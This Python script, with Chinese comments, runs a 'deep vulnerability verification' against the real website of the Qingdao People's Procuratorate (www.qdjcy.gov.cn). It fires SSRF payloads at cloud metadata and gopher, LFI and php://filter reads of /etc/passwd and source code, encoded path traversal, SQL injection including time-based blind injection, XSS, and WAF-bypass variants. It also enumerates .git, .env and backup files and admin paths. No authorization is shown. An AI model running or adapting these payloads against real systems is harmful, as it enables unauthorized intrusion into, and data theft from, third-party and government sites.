#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
青岛市人民检察院 www.qdjcy.gov.cn 深度漏洞验证脚本
针对告警 URL 模式: brmidyrvj.php?url=...&localurl=...
全面排查潜在衍生漏洞

用法: python deep_scan.py
"""

import requests
import os
import sys
import time
import hashlib
import urllib.parse

os.environ["NO_PROXY"] = "*"

TARGET = "http://www.qdjcy.gov.cn"
TIMEOUT = 10
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
}

# 颜色（Windows 兼容）
class C:
    OK = "\033[92m"
    WARN = "\033[93m"
    BAD = "\033[91m"
    INFO = "\033[96m"
    END = "\033[0m"
    BOLD = "\033[1m"

results = []  # 收集所有结果用于报告


def log(test_name, status, detail="", risk="info"):
    """记录结果 status: OK/WARN/BAD/INFO"""
    color = {"OK": C.OK, "WARN": C.WARN, "BAD": C.BAD, "INFO": C.INFO}.get(status, "")
    risk_label = {"info": "[信息]", "low": "[低危]", "medium": "[中危]", "high": "[高危]"}.get(risk, "[信息]")
    print(f"{color}{risk_label} [{status}] {test_name}{C.END}")
    if detail:
        print(f"       {detail}")
    results.append({"test": test_name, "status": status, "detail": detail, "risk": risk})


def req(path, params=None, method="GET", headers=None, allow_redir=False):
    """统一请求"""
    try:
        r = requests.request(
            method, TARGET + path,
            params=params, headers=headers or HEADERS,
            timeout=TIMEOUT, allow_redirects=allow_redir, verify=False
        )
        return r
    except requests.exceptions.Timeout:
        return "TIMEOUT"
    except requests.exceptions.ConnectionError as e:
        return f"CONN_ERR: {str(e)[:80]}"
    except Exception as e:
        return f"ERR: {str(e)[:80]}"


def section(title):
    print(f"\n{C.BOLD}{C.INFO}{'='*70}\n  {title}\n{'='*70}{C.END}")


# ============================================================
def test1_brmidyrvj_existence():
    """测试1: brmidyrvj.php 文件存在性多角度验证"""
    section("测试1: brmidyrvj.php 文件存在性多角度验证")

    # 1.1 GET 无参数
    r = req("/html/zdal/20200605/1/brmidyrvj.php")
    if isinstance(r, str):
        log("GET无参数", "INFO", f"连接异常: {r}")
        return
    etag_get = r.headers.get("ETag", "")
    log("GET无参数", "OK" if r.status_code == 404 else "WARN",
        f"状态={r.status_code} 大小={len(r.content)} ETag={etag_get}",
        "info")

    # 1.2 HEAD
    r = req("/html/zdal/20200605/1/brmidyrvj.php", method="HEAD")
    if not isinstance(r, str):
        log("HEAD请求", "OK" if r.status_code == 404 else "WARN",
            f"状态={r.status_code} ETag={r.headers.get('ETag','')}", "info")

    # 1.3 POST
    r = req("/html/zdal/20200605/1/brmidyrvj.php", method="POST")
    if not isinstance(r, str):
        log("POST请求", "OK" if r.status_code == 404 else "WARN",
            f"状态={r.status_code} 大小={len(r.content)}", "info")

    # 1.4 不存在文件 vs 真实404页面对比
    r2 = req("/this_really_does_not_exist_xxx.php")
    if not isinstance(r2, str):
        same = (r.status_code == r2.status_code and
                r.headers.get("ETag","") == r2.headers.get("ETag",""))
        log("404页面一致性对比", "OK" if same else "WARN",
            f"brmidyrvj: {r.status_code}/{r.headers.get('ETag','')} vs 不存在文件: {r2.status_code}/{r2.headers.get('ETag','')} -> {'相同(确为不存在)' if same else '不同(需关注)'}",
            "info")

    # 1.5 不同参数响应一致性（参数被忽略的证据）
    payloads = ["a", "test123", "<script>", "file:///etc/passwd" if False else "test",
                "IMG*file:///test", "javascript:alert(1)"]
    print(f"\n  --- 不同参数响应对比（参数是否被处理）---")
    base_hash = None
    for p in payloads:
        r = req("/html/zdal/20200605/1/brmidyrvj.php", params={"url": p})
        if isinstance(r, str):
            print(f"    url={p[:30]:30s} -> {r}")
            continue
        h = hashlib.md5(r.content).hexdigest()
        if base_hash is None:
            base_hash = h
        same = "✓相同" if h == base_hash else "✗不同"
        print(f"    url={p[:30]:30s} -> 状态={r.status_code} MD5={h[:8]} {same}")


# ============================================================
def test2_ssrf():
    """测试2: SSRF 测试（假设 PHP 存在时的 url 参数行为）"""
    section("测试2: SSRF 测试")

    # 由于 PHP 文件不存在，所有 url 参数都被忽略，但仍测试 WAF 行为
    test_cases = [
        ("http://example.com", "外链http"),
        ("http://127.0.0.1:80", "内网回环"),
        ("http://127.0.0.1:22", "内网SSH端口"),
        ("http://169.254.169.254/latest/meta-data/", "AWS元数据"),
        ("dict://127.0.0.1:22", "dict协议"),
        ("gopher://127.0.0.1:22/_test", "gopher协议"),
        ("http://www.baidu.com", "国内可访问"),
    ]
    for payload, desc in test_cases:
        r = req("/html/zdal/20200605/1/brmidyrvj.php", params={"url": payload})
        if isinstance(r, str):
            log(f"SSRF-{desc}", "INFO", f"payload={payload} -> {r} (WAF拦截或超时)", "low")
        else:
            log(f"SSRF-{desc}", "OK" if r.status_code == 404 else "WARN",
                f"payload={payload} -> 状态={r.status_code} 大小={len(r.content)}",
                "info")


# ============================================================
def test3_lfi():
    """测试3: LFI/任意文件读取测试"""
    section("测试3: LFI/任意文件读取测试")

    test_cases = [
        ("file:///etc/passwd", "Linux系统文件"),
        ("file:///C:/Windows/win.ini", "Windows系统文件"),
        ("/etc/passwd", "绝对路径"),
        ("../../../../etc/passwd", "相对路径穿越"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP协议读源码"),
        ("php://filter/read=string.rot13/resource=index.php", "PHP协议rot13"),
        ("data://text/plain;base64,dGVzdA==", "data协议"),
        ("expect://id", "expect协议"),
    ]
    for payload, desc in test_cases:
        r = req("/html/zdal/20200605/1/brmidyrvj.php", params={"url": payload})
        if isinstance(r, str):
            log(f"LFI-{desc}", "WARN" if "TIMEOUT" in r else "INFO",
                f"payload={payload[:50]} -> {r} (可能WAF拦截)", "low")
        else:
            # 检查响应中是否泄露系统文件内容
            leaked = any(kw in r.text for kw in ["root:x:", "[extensions]", "[fonts]"])
            log(f"LFI-{desc}", "BAD" if leaked else "OK",
                f"payload={payload[:50]} -> 状态={r.status_code} 大小={len(r.content)} {'!!!泄露!!!' if leaked else ''}",
                "high" if leaked else "info")


# ============================================================
def test4_path_traversal():
    """测试4: 路径穿越测试"""
    section("测试4: 路径穿越测试")

    traversals = [
        ("/../../../etc/passwd", "标准穿越"),
        ("/..%2f..%2f..%2fetc%2fpasswd", "URL编码穿越"),
        ("/..%252f..%252f..%252fetc%252fpasswd", "双重编码"),
        ("/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "点号编码"),
        ("/..%5c..%5c..%5cwindows%5cwin.ini", "反斜杠穿越"),
        ("/....//....//....//etc/passwd", "双点绕过"),
    ]
    for payload, desc in traversals:
        r = req(f"/html/zdal/20200605/1/brmidyrvj.php{payload}")
        if isinstance(r, str):
            log(f"穿越-{desc}", "INFO", f"{payload[:40]} -> {r}", "low")
        else:
            leaked = "root:x:" in r.text or "[fonts]" in r.text
            log(f"穿越-{desc}", "BAD" if leaked else "OK",
                f"{payload[:40]} -> 状态={r.status_code} 大小={len(r.content)}",
                "high" if leaked else "info")


# ============================================================
def test5_backup_and_hidden():
    """测试5: 备份文件与隐藏文件探测"""
    section("测试5: 备份文件与隐藏文件探测")

    files = [
        "brmidyrvj.php.bak", "brmidyrvj.php~", "brmidyrvj.bak", "brmidyrvj.txt",
        "brmidyrvj.old", ".brmidyrvj.php.swp", "brmidyrvj.php.orig",
        "brmidyrvj.php.save", "brmidyrvj.php.tmp", "brmidyrvj.php.1",
        # 编辑器临时文件
        ".brmidyrvj.php.swp", "brmidyrvj.php.swp",
        # 其他常见PHP
        "index.php", "test.php", "admin.php", "config.php", "api.php",
        "count.php", "log.php", "upload.php", "file.php", "read.php",
        # 同目录文件探测
        "1671.php", "1671.html.bak",
        # git/svn
        ".git/HEAD", ".git/config", ".svn/entries", ".svn/wc.db",
        # 配置文件
        "config.php", "database.php", "db.php", "conn.php",
        # robots
        "robots.txt",
    ]
    found = []
    for f in files:
        r = req(f"/html/zdal/20200605/1/{f}")
        if isinstance(r, str):
            continue
        if r.status_code == 200:
            found.append((f, r.status_code, len(r.content)))
            log(f"文件: {f}", "WARN",
                f"状态={r.status_code} 大小={len(r.content)}", "low")
        elif r.status_code == 403:
            log(f"文件: {f}", "INFO",
                f"状态=403 (禁止访问，文件可能存在)", "info")
    if not found:
        log("备份/隐藏文件", "OK", "未发现可访问的备份/隐藏文件", "info")


# ============================================================
def test6_api_count_injection():
    """测试6: api.php?op=count 参数注入测试"""
    section("测试6: api.php?op=count 参数注入测试")

    test_cases = [
        ({"op": "count", "id": "1", "modelid": "1"}, "基线"),
        ({"op": "count", "id": "1'", "modelid": "1"}, "单引号SQL注入"),
        ({"op": "count", "id": "1 AND 1=1", "modelid": "1"}, "SQL布尔盲注"),
        ({"op": "count", "id": "1 UNION SELECT 1", "modelid": "1"}, "UNION注入"),
        ({"op": "count", "id": "1;WAITFOR DELAY '0:0:3'", "modelid": "1"}, "时间盲注"),
        ({"op": "count", "id": "<script>alert(1)</script>", "modelid": "1"}, "XSS"),
        ({"op": "count", "id": "1../../../etc/passwd", "modelid": "1"}, "路径穿越"),
        ({"op": "count", "id": "1", "modelid": "1'"}, "modelid注入"),
    ]
    for params, desc in test_cases:
        r = req("/api.php", params=params)
        if isinstance(r, str):
            log(f"api.php-{desc}", "INFO", f"{params} -> {r}", "info")
            continue
        # 检测SQL错误
        sql_err = any(kw in r.text.lower() for kw in [
            "mysql_", "sql syntax", "mysql_fetch", "warning: mysql",
            "odbc_", "oracle", "postgresql", "sqlite"
        ])
        # 检测XSS反射
        xss = "<script>alert(1)</script>" in r.text
        if sql_err:
            log(f"api.php-{desc}", "BAD", f"SQL错误泄露! 大小={len(r.content)}", "high")
        elif xss:
            log(f"api.php-{desc}", "BAD", f"XSS反射!", "high")
        else:
            log(f"api.php-{desc}", "OK", f"状态={r.status_code} 大小={len(r.content)}", "info")


# ============================================================
def test7_directory_listing():
    """测试7: 目录列目录测试"""
    section("测试7: 目录列目录测试")

    dirs = [
        "/statics/", "/statics/js/", "/statics/js/qingjian/",
        "/statics/images/qingjian/", "/statics/css/qingjian/",
        "/html/zdal/", "/html/zdal/20200605/", "/html/zdal/20200605/1/",
        "/upload/", "/uploads/", "/data/", "/cache/",
        "/html/", "/html/news/", "/html/tzgg/",
    ]
    for d in dirs:
        r = req(d)
        if isinstance(r, str):
            continue
        # 列目录特征: Index of / 或 <title>Index of
        listing = "Index of" in r.text or "Directory listing" in r.text
        if listing:
            log(f"目录: {d}", "BAD", f"可列目录! 大小={len(r.content)}", "medium")
        elif r.status_code == 200 and len(r.content) > 1000:
            log(f"目录: {d}", "INFO", f"200响应 大小={len(r.content)}", "info")
        elif r.status_code == 403:
            log(f"目录: {d}", "OK", "403禁止", "info")


# ============================================================
def test8_waf_bypass():
    """测试8: WAF 规则与绕过测试"""
    section("测试8: WAF 规则与绕过测试")

    test_cases = [
        ("file:///etc/passwd", "明文file://"),
        ("File:///etc/passwd", "大小写绕过"),
        ("fiLE:///etc/passwd", "混合大小写"),
        ("file%3A///etc/passwd", "URL编码:"),
        ("file%3a%2f%2fetc%2fpasswd", "全URL编码"),
        ("file%253A%2f%2fetc%2fpasswd", "双重编码"),
        (" IMG*file:///etc/passwd", "前缀资源清单标记"),
        ("file%00:///etc/passwd", "空字节"),
        ("javascript:alert(1)", "javascript协议"),
        ("JaVaScRiPt:alert(1)", "JS大小写"),
        ("<script>alert(1)</script>", "XSS payload"),
        ("php://filter/resource=index.php", "PHP协议"),
        ("data:text/html,<script>alert(1)</script>", "data协议"),
    ]
    for payload, desc in test_cases:
        r = req("/html/zdal/20200605/1/brmidyrvj.php", params={"url": payload})
        if isinstance(r, str):
            log(f"WAF-{desc}", "WARN", f"payload={payload[:30]} -> {r}", "low")
        else:
            log(f"WAF-{desc}", "OK" if r.status_code == 404 else "WARN",
                f"payload={payload[:30]} -> 状态={r.status_code} 大小={len(r.content)}",
                "info")


# ============================================================
def test9_page_sensitive_info():
    """测试9: 1671.html 页面敏感信息检查"""
    section("测试9: 1671.html 页面敏感信息检查")

    r = req("/html/zdal/20200605/1/1671.html")
    if isinstance(r, str):
        log("1671.html访问", "INFO", f"连接失败: {r}", "info")
        return

    log("1671.html访问", "OK", f"状态={r.status_code} 大小={len(r.content)}", "info")
    text = r.text

    # 检查敏感信息
    patterns = [
        (r"\b\d{15,18}\b", "身份证号"),
        (r"\b1[3-9]\d{9}\b", "手机号"),
        (r"\b[\w.-]+@[\w.-]+\.\w+\b", "邮箱"),
        (r"password\s*[=:]", "密码字段"),
        (r"passwd\s*[=:]", "密码字段"),
        (r"\bmysql_connect\(", "数据库函数"),
        (r"\bDB_PASSWORD\b", "数据库密码"),
        (r"\bJWT\b", "JWT令牌"),
        (r"\bAKIA[A-Z0-9]{16}\b", "AWS密钥"),
        (r"\bapi[_-]?key\s*[=:]", "API密钥"),
        (r"\bsecret\s*[=:]", "密钥"),
        (r"/upload/", "上传目录"),
        (r"/admin/", "管理后台"),
        (r"\.git/", "git仓库"),
        (r"\.bak\b", "备份文件"),
    ]
    import re
    for pat, desc in patterns:
        matches = re.findall(pat, text, re.IGNORECASE)
        if matches:
            log(f"敏感信息-{desc}", "WARN",
                f"匹配到{len(matches)}处: {matches[:3]}", "medium")


# ============================================================
def test10_additional_vuln():
    """测试10: 其他常见漏洞快速探测"""
    section("测试10: 其他常见漏洞快速探测")

    # 10.1 robots.txt
    r = req("/robots.txt")
    if not isinstance(r, str) and r.status_code == 200:
        log("robots.txt", "INFO", f"存在, 大小={len(r.content)}", "info")
        print(f"    内容预览: {r.text[:200]}")

    # 10.2 sitemap.xml
    r = req("/sitemap.xml")
    if not isinstance(r, str) and r.status_code == 200:
        log("sitemap.xml", "INFO", f"存在, 大小={len(r.content)}", "info")

    # 10.3 .env 文件
    r = req("/.env")
    if not isinstance(r, str) and r.status_code == 200:
        log(".env文件", "BAD", f"敏感配置文件可访问! 大小={len(r.content)}", "high")

    # 10.4 phpinfo
    r = req("/phpinfo.php")
    if not isinstance(r, str) and r.status_code == 200 and "phpinfo" in r.text.lower():
        log("phpinfo", "BAD", "phpinfo页面可访问!", "medium")

    # 10.5 管理后台
    for path in ["/admin", "/admin.php", "/login.php", "/manage", "/manager",
                 "/wp-admin", "/administrator"]:
        r = req(path)
        if not isinstance(r, str):
            if r.status_code in [200, 301, 302]:
                log(f"后台-{path}", "INFO",
                    f"状态={r.status_code} 大小={len(r.content)}", "info")

    # 10.6 常见CMS特征
    r = req("/")
    if not isinstance(r, str):
        if "powered by" in r.text.lower():
            import re
            m = re.findall(r'powered by[^<]{0,50}', r.text, re.IGNORECASE)
            if m:
                log("CMS指纹", "INFO", f"识别: {m[:2]}", "info")
        if "wordpress" in r.text.lower():
            log("CMS", "INFO", "WordPress特征", "info")
        if "dedecms" in r.text.lower() or "dede" in r.text.lower():
            log("CMS", "WARN", "DedeCMS特征(常见漏洞多)", "low")

    # 10.7 HTTP 安全头检查
    r = req("/")
    if not isinstance(r, str):
        security_headers = [
            "X-Frame-Options", "X-Content-Type-Options", "X-XSS-Protection",
            "Strict-Transport-Security", "Content-Security-Policy",
            "Referrer-Policy"
        ]
        missing = [h for h in security_headers if h not in r.headers]
        if missing:
            log("HTTP安全头", "WARN", f"缺失: {', '.join(missing)}", "low")
        else:
            log("HTTP安全头", "OK", "安全头完整", "info")

    # 10.8 nginx 版本信息泄露
    r = req("/")
    if not isinstance(r, str):
        server = r.headers.get("Server", "")
        if server == "nginx":
            log("Server头", "OK", "未泄露nginx版本", "info")
        else:
            log("Server头", "INFO", f"Server: {server}", "info")


# ============================================================
def generate_report():
    """生成汇总报告"""
    section("汇总报告")

    stats = {"OK": 0, "WARN": 0, "BAD": 0, "INFO": 0}
    risk_count = {"info": 0, "low": 0, "medium": 0, "high": 0}
    for r in results:
        stats[r["status"]] = stats.get(r["status"], 0) + 1
        risk_count[r["risk"]] = risk_count.get(r["risk"], 0) + 1

    print(f"""
{C.BOLD}扫描统计:{C.END}
  通过(OK): {C.OK}{stats['OK']}{C.END}
  警告(WARN): {C.WARN}{stats['WARN']}{C.END}
  漏洞(BAD): {C.BAD}{stats['BAD']}{C.END}
  信息(INFO): {C.INFO}{stats['INFO']}{C.END}

{C.BOLD}风险分布:{C.END}
  高危: {C.BAD}{risk_count['high']}{C.END}
  中危: {C.WARN}{risk_count['medium']}{C.END}
  低危: {C.WARN}{risk_count['low']}{C.END}
  信息: {C.INFO}{risk_count['info']}{C.END}
""")

    # 列出所有 BAD/WARN 项
    issues = [r for r in results if r["status"] in ("BAD", "WARN")]
    if issues:
        print(f"{C.BOLD}需关注项:{C.END}")
        for r in issues:
            color = C.BAD if r["status"] == "BAD" else C.WARN
            print(f"  {color}[{r['status']}] {r['test']}{C.END}")
            if r["detail"]:
                print(f"       {r['detail']}")
    else:
        print(f"{C.OK}无 BAD/WARN 项{C.END}")

    print(f"\n{C.BOLD}最终结论:{C.END}")
    if risk_count["high"] == 0 and risk_count["medium"] == 0:
        print(f"  {C.OK}未发现高危/中危漏洞{C.END}")
        print(f"  原告警确认为误报，无实际安全风险")
    else:
        print(f"  {C.WARN}发现 {risk_count['high']} 高危, {risk_count['medium']} 中危{C.END}")
        print(f"  建议对 BAD 项进一步处理")


# ============================================================
def main():
    print(f"{C.BOLD}{'#'*70}\n# 青岛市人民检察院 www.qdjcy.gov.cn 深度漏洞验证\n# 目标: brmidyrvj.php 及相关接口\n{'#'*70}{C.END}")

    test1_brmidyrvj_existence()
    test2_ssrf()
    test3_lfi()
    test4_path_traversal()
    test5_backup_and_hidden()
    test6_api_count_injection()
    test7_directory_listing()
    test8_waf_bypass()
    test9_page_sensitive_info()
    test10_additional_vuln()

    generate_report()


if __name__ == "__main__":
    main()
